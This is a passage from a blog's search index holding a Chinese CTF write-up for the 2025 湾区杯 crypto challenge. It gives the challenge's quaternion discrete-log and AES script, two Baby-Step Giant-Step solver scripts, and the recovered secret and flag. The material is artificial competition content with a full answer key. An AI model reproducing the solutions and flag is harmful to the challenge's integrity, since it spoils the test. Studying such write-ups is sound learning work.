<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>25年湾区杯网络安全竞赛--Crypto</title>
      <link href="/posts/b2d0ce5d.html"/>
      <url>/posts/b2d0ce5d.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>今天参加了25年湾区杯，我负责的是Crypto方向的题目，题目有两道，一道RSA加密、另一道结合了三种加密方式。博主只解出来了后者。来总结一下我的WriteUp。</p></blockquote><h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p><strong>题目文件</strong>  </p><ul><li><code>task.py</code> 加密脚本 </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag, secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> secret &lt; <span class="number">2</span> ** <span class="number">50</span></span><br><span class="line">p = <span class="number">115792089237316195423570985008687907853269984665640564039457584007913129639747</span></span><br><span class="line">Q_components = (<span class="number">123456789</span>, <span class="number">987654321</span>, <span class="number">135792468</span>, <span class="number">864297531</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Quaternion</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p = p</span><br><span class="line">        <span class="variable language_">self</span>.a = a % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="variable language_">self</span>.b = b % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="variable language_">self</span>.c = c % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="variable language_">self</span>.d = d % <span class="variable language_">self</span>.p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Q(<span class="subst">&#123;self.a&#125;</span>, <span class="subst">&#123;self.b&#125;</span>, <span class="subst">&#123;self.c&#125;</span>, <span class="subst">&#123;self.d&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line">        a1, b1, c1, d1 = <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.c, <span class="variable language_">self</span>.d</span><br><span class="line">        a2, b2, c2, d2 = other.a, other.b, other.c, other.d</span><br><span class="line">        a_new = a1 * a2 - b1 * b2 - c1 * c2 - d1 * d2</span><br><span class="line">        b_new = a1 * b2 + b1 * a2 + c1 * d2 - d1 * c2</span><br><span class="line">        c_new = a1 * c2 - b1 * d2 + c1 * a2 + d1 * b2</span><br><span class="line">        d_new = a1 * d2 + b1 * c2 - c1 * b2 + d1 * a2</span><br><span class="line">        <span class="keyword">return</span> Quaternion(a_new, b_new, c_new, d_new)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">base_quat, exp</span>):</span><br><span class="line">    res = Quaternion(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    base = base_quat</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            res = res * base</span><br><span class="line">        base = base * base</span><br><span class="line">        exp //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">Q = Quaternion(*Q_components)</span><br><span class="line">R = power(Q,secret)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--- Public Parameters ---&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Q = <span class="subst">&#123;Q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;R = <span class="subst">&#123;R&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">--- Public Parameters ---</span></span><br><span class="line"><span class="string">p = 115792089237316195423570985008687907853269984665640564039457584007913129639747</span></span><br><span class="line"><span class="string">Q = Q(123456789, 987654321, 135792468, 864297531)</span></span><br><span class="line"><span class="string">R = Q(53580504271939954579696282638160058429308301927753139543147605882574336327145, 79991318245209837622945719467562796951137605212294979976479199793453962090891, 53126869889181040587037210462276116096032594677560145306269148156034757160128, 97368024230306399859522783292246509699830254294649668434604971213496467857155)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">key = md5(<span class="built_in">str</span>(secret).encode()).hexdigest().encode()</span><br><span class="line">cipher = AES.new(key=key,mode=AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(cipher.encrypt(pad(flag,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;(\xe4IJ\xfd4%\xcf\xad\xb4\x7fi\xae\xdbZux6-\xf4\xd72\x14BB\x1e\xdc\xb7\xb7\xd1\xad#e@\x17\x1f\x12\xc4\xe5\xa6\x10\x91\x08\xd6\x87\x82H\x9e&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>目标</strong><br>已知四元数 <code>Q</code>、模数 <code>p</code> 和 <code>R = Q^secret</code>，secret &lt; 2⁵⁰，求出 secret 后解密 AES 密文。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="1-题目的加密分析"><a href="#1-题目的加密分析" class="headerlink" title="1. 题目的加密分析"></a>1. 题目的加密分析</h3><ol><li>在有限域 <code>p = 115792089237316195423570985008687907853269984665640564039457584007913129639747</code> 上定义四元数乘法  </li><li>计算 <code>R = Q^secret</code>  </li><li>取 <code>key = MD5(str(secret)).hexdigest().encode()</code>（32 字节 → 16 字节）  </li><li>AES-ECB 加密 flag</li></ol><p>使用了四元数离散对数加密、MD5密钥派生、AES-ECB加密。</p><h3 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2. 解题思路"></a>2. 解题思路</h3><p>把「四元数」当做群元素，问题即 <strong>求离散对数</strong> <code>R = Q^secret</code>。<br>secret 上限 2⁵⁰，可直接用 <strong>Baby-Step Giant-Step</strong>：</p><ul><li>令 <code>m = 2^25 ≈ √2⁵⁰</code>  </li><li><strong>Baby-Step</strong>：预先计算并存储 <code>&#123;Q^j : j=0…m-1&#125;</code>  </li><li><strong>Giant-Step</strong>：从 <code>R</code> 出发，每次乘 <code>Q^(-m)</code>，看是否命中表中某个 <code>j</code><br>一旦命中 ⇒ <code>secret = i*m + j</code></li></ul><p>由于数值过大，相应的运算时间也会比较长。</p><h3 id="3-解题脚本要点"><a href="#3-解题脚本要点" class="headerlink" title="3. 解题脚本要点"></a>3. 解题脚本要点</h3><ul><li>手写四元数类，乘法全部模 <code>p</code>  </li><li>用 <code>pow(norm, -1, p)</code> 求逆，避免浮点  </li><li>字典键用 <code>tuple(int)</code>，速度远快于 <code>str(matrix)</code>  </li><li>最后按题目格式生成 32-字节 key：<br><code>key = md5(str(secret).encode()).hexdigest().encode()</code></li></ul><h3 id="4-脚本代码"><a href="#4-脚本代码" class="headerlink" title="4. 脚本代码"></a>4. 脚本代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p = <span class="number">115792089237316195423570985008687907853269984665640564039457584007913129639747</span></span><br><span class="line">Q_c = (<span class="number">123456789</span>, <span class="number">987654321</span>, <span class="number">135792468</span>, <span class="number">864297531</span>)</span><br><span class="line">R_c = (</span><br><span class="line">    <span class="number">53580504271939954579696282638160058429308301927753139543147605882574336327145</span>,</span><br><span class="line">    <span class="number">79991318245209837622945719467562796951137605212294979976479199793453962090891</span>,</span><br><span class="line">    <span class="number">53126869889181040587037210462276116096032594677560145306269148156034757160128</span>,</span><br><span class="line">    <span class="number">97368024230306399859522783292246509699830254294649668434604971213496467857155</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Q</span>:</span><br><span class="line">    __slots__ = (<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.c, <span class="variable language_">self</span>.d = a % p, b % p, c % p, d % p</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, o</span>):</span><br><span class="line">        a1, b1, c1, d1 = <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.c, <span class="variable language_">self</span>.d</span><br><span class="line">        a2, b2, c2, d2 = o.a, o.b, o.c, o.d</span><br><span class="line">        <span class="keyword">return</span> Q(</span><br><span class="line">            (a1 * a2 - b1 * b2 - c1 * c2 - d1 * d2) % p,</span><br><span class="line">            (a1 * b2 + b1 * a2 + c1 * d2 - d1 * c2) % p,</span><br><span class="line">            (a1 * c2 - b1 * d2 + c1 * a2 + d1 * b2) % p,</span><br><span class="line">            (a1 * d2 + b1 * c2 - c1 * b2 + d1 * a2) % p,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">self</span>):</span><br><span class="line">        a, b, c, d = <span class="variable language_">self</span>.a, (-<span class="variable language_">self</span>.b) % p, (-<span class="variable language_">self</span>.c) % p, (-<span class="variable language_">self</span>.d) % p</span><br><span class="line">        n = <span class="built_in">pow</span>((<span class="variable language_">self</span>.a ** <span class="number">2</span> + <span class="variable language_">self</span>.b ** <span class="number">2</span> + <span class="variable language_">self</span>.c ** <span class="number">2</span> + <span class="variable language_">self</span>.d ** <span class="number">2</span>) % p, -<span class="number">1</span>, p)</span><br><span class="line">        <span class="keyword">return</span> Q(a * n % p, b * n % p, c * n % p, d * n % p)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tup</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.c, <span class="variable language_">self</span>.d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpow</span>(<span class="params">q, e</span>):</span><br><span class="line">    r = Q(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> e:</span><br><span class="line">        <span class="keyword">if</span> e &amp; <span class="number">1</span>:</span><br><span class="line">            r = r * q</span><br><span class="line">        q = q * q</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs</span>(<span class="params">Q_base, R_target</span>):</span><br><span class="line">    m = <span class="number">1</span> &lt;&lt; <span class="number">25</span>  <span class="comment"># sqrt(2^50)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Baby-step …&quot;</span>)</span><br><span class="line">    tbl = &#123;&#125;</span><br><span class="line">    baby = Q(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        tbl[baby.tup()] = j</span><br><span class="line">        baby = baby * Q_base</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Giant-step …&quot;</span>)</span><br><span class="line">    Q_inv = Q_base.inv()</span><br><span class="line">    Q_step = qpow(Q_inv, m)</span><br><span class="line">    giant = R_target</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        tup = giant.tup()</span><br><span class="line">        <span class="keyword">if</span> tup <span class="keyword">in</span> tbl:</span><br><span class="line">            <span class="keyword">return</span> i * m + tbl[tup]</span><br><span class="line">        giant = giant * Q_step</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    t0 = time.time()</span><br><span class="line">    Q_base, R_target = Q(*Q_c), Q(*R_c)</span><br><span class="line">    secret = bsgs(Q_base, R_target)</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到 secret&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] secret = <span class="subst">&#123;secret&#125;</span>  (<span class="subst">&#123;time.time()-t0:<span class="number">.1</span>f&#125;</span>s)&quot;</span>)</span><br><span class="line">    key = md5(<span class="built_in">str</span>(secret).encode()).hexdigest().encode()</span><br><span class="line">    ct = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">        <span class="string">&quot;28e4494afd3425cfadb47f69aedb5a7578362df4d7321442421edcb7b7d1ad236540171f12c4e5a6109108d68782489e&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Flag:&quot;</span>, unpad(AES.new(key, AES.MODE_ECB).decrypt(ct), <span class="number">16</span>).decode())</span><br></pre></td></tr></table></figure><h3 id="5-运行结果"><a href="#5-运行结果" class="headerlink" title="5. 运行结果"></a>5. 运行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Baby-step …</span><br><span class="line">[+] Giant-step …</span><br><span class="line">[+] secret = 895942422329  (104.6s)</span><br><span class="line">[+] Flag: flag&#123;ef9b2a64b3ead115a48ee0b842dc19ed&#125;</span><br></pre></td></tr></table></figure><blockquote><p>博主的脚本感觉还是差点意思，运行时间有点长，因此相对来说解密的成本就会很高。继续努力！！</p><p>附从其他文章看到的解密脚本：<a href="https://mp.weixin.qq.com/s/PdAV_jhRpJJh5y1-WdvDtg">2025湾区杯网络安全竞赛WriteUP</a><br>    <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- Public parameters ----------------</span></span><br><span class="line">p = <span class="number">115792089237316195423570985008687907853269984665640564039457584007913129639747</span></span><br><span class="line">Q_components = (<span class="number">123456789</span>, <span class="number">987654321</span>, <span class="number">135792468</span>, <span class="number">864297531</span>)</span><br><span class="line">R_components = (</span><br><span class="line">    <span class="number">53580504271939954579696282638160058429308301927753139543147605882574336327145</span>,</span><br><span class="line">    <span class="number">79991318245209837622945719467562796951137605212294979976479199793453962090891</span>,</span><br><span class="line">    <span class="number">53126869889181040587037210462276116096032594677560145306269148156034757160128</span>,</span><br><span class="line">    <span class="number">97368024230306399859522783292246509699830254294649668434604971213496467857155</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">b&#x27;(\xe4IJ\xfd4%\xcf\xad\xb4\x7fi\xae\xdbZux6-\xf4\xd72\x14BB\x1e\xdc\xb7\xb7\xd1\xad#e@\x17\x1f\x12\xc4\xe5\xa6\x10\x91\x08\xd6\x87\x82H\x9e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- Quaternion arithmetic ----------------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Quaternion</span>:</span><br><span class="line">    __slots__=(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b,c,d</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a=a%p;<span class="variable language_">self</span>.b=b%p;<span class="variable language_">self</span>.c=c%p;<span class="variable language_">self</span>.d=d%p</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,other</span>):</span><br><span class="line">        a1,b1,c1,d1 = <span class="variable language_">self</span>.a,<span class="variable language_">self</span>.b,<span class="variable language_">self</span>.c,<span class="variable language_">self</span>.d</span><br><span class="line">        a2,b2,c2,d2 = other.a,other.b,other.c,other.d</span><br><span class="line">        <span class="keyword">return</span> Quaternion(</span><br><span class="line">            (a1*a2 - b1*b2 - c1*c2 - d1*d2)%p,</span><br><span class="line">            (a1*b2 + b1*a2 + c1*d2 - d1*c2)%p,</span><br><span class="line">            (a1*c2 - b1*d2 + c1*a2 + d1*b2)%p,</span><br><span class="line">            (a1*d2 + b1*c2 - c1*b2 + d1*a2)%p</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self,other</span>): <span class="keyword">return</span> (<span class="variable language_">self</span>.a,<span class="variable language_">self</span>.b,<span class="variable language_">self</span>.c,<span class="variable language_">self</span>.d)==(other.a,other.b,other.c,other.d)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>): <span class="keyword">return</span> <span class="built_in">hash</span>((<span class="variable language_">self</span>.a,<span class="variable language_">self</span>.b,<span class="variable language_">self</span>.c,<span class="variable language_">self</span>.d))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">conjugate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> Quaternion(<span class="variable language_">self</span>.a,-<span class="variable language_">self</span>.b,-<span class="variable language_">self</span>.c,-<span class="variable language_">self</span>.d)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">norm</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.a*<span class="variable language_">self</span>.a + <span class="variable language_">self</span>.b*<span class="variable language_">self</span>.b + <span class="variable language_">self</span>.c*<span class="variable language_">self</span>.c + <span class="variable language_">self</span>.d*<span class="variable language_">self</span>.d) % p</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inverse</span>(<span class="params">self</span>):</span><br><span class="line">        n=<span class="variable language_">self</span>.norm()</span><br><span class="line">        n_inv=<span class="built_in">pow</span>(n,-<span class="number">1</span>,p)</span><br><span class="line">        qc=<span class="variable language_">self</span>.conjugate()</span><br><span class="line">        <span class="keyword">return</span> Quaternion(qc.a*n_inv, qc.b*n_inv, qc.c*n_inv, qc.d*n_inv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">base,exp</span>):</span><br><span class="line">    res = Quaternion(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp&amp;<span class="number">1</span>: res=res*base</span><br><span class="line">        base=base*base</span><br><span class="line">        exp//=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">Q=Quaternion(*Q_components)</span><br><span class="line">R=Quaternion(*R_components)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- Optimized BSGS ----------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs</span>(<span class="params">base, target, bound</span>):</span><br><span class="line">    m=<span class="built_in">int</span>(math.isqrt(bound))+<span class="number">1</span></span><br><span class="line">    baby=&#123;&#125;</span><br><span class="line">    cur=Quaternion(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="comment"># 存储时只存 tuple，避免 Quaternion 对象占内存</span></span><br><span class="line">        baby[(cur.a,cur.b,cur.c,cur.d)]=j</span><br><span class="line">        cur=cur*base</span><br><span class="line">        <span class="keyword">if</span> j%<span class="number">500000</span>==<span class="number">0</span> <span class="keyword">and</span> j&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Baby step <span class="subst">&#123;j&#125;</span>/<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># giant step</span></span><br><span class="line">    factor = power(base.inverse(), m)</span><br><span class="line">    cur=target</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">        t=(cur.a,cur.b,cur.c,cur.d)</span><br><span class="line">        <span class="keyword">if</span> t <span class="keyword">in</span> baby:</span><br><span class="line">            <span class="keyword">return</span> i*m+baby[t]</span><br><span class="line">        cur=cur*factor</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">100000</span>==<span class="number">0</span> <span class="keyword">and</span> i&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Giant step <span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- Run ----------------</span></span><br><span class="line">t0 = time.time()</span><br><span class="line">N=<span class="number">1</span>&lt;&lt;<span class="number">50</span></span><br><span class="line">secret=bsgs(Q,R,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] secret = <span class="subst">&#123;secret&#125;</span>  (<span class="subst">&#123;time.time()-t0:<span class="number">.1</span>f&#125;</span>s)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- Decrypt ----------------</span></span><br><span class="line">key=md5(<span class="built_in">str</span>(secret).encode()).hexdigest().encode()</span><br><span class="line">cipher=AES.new(key,AES.MODE_ECB)</span><br><span class="line">plaintext=unpad(cipher.decrypt(ciphertext),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] FLAG:&quot;</span>,plaintext.decode())</span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/posts/8d4b7ae1.html"/>
      <url>/posts/8d4b7ae1.html</url>
      
